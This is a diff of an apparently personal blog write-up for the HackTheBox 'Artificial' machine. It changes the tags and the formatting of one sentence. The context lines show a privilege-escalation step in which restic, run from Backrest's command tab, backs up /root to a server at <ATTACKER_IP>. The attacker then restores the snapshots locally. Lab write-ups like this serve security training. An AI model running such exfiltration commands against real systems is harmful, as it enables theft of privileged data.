@@ -2,7 +2,7 @@
 title: " HackTheBox Artificial Writeup"
 date: 2025-09-29
 categories: [HTB, Machines]
-tags: [Linux, CVE, rest-server, snapshot]
+tags: [Linux, CVE, restic, snapshots]
 image:
   path: /assets/Artificial-htb/1.png
   lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
@@ -147,7 +147,7 @@ On the target’s Backrest interface ```(Run Command tab)```, I executed restic 
 -r rest:http://<ATTACKER_IP>:12345/exploit backup /root
 ```
 ![s2](/assets/Artificial-htb/s2.png)
-- On my attacker machine, I used restic to view snapshots and restore the backed-up data:
+- On my attacker machine, I used restic to view snapshots and restore the ```backed-up``` data:
 ```shell
 restic -r /tmp/restic-data/exploit snapshots
 restic -r /tmp/restic-data/exploit restore <snapshot-id> --target ./restore
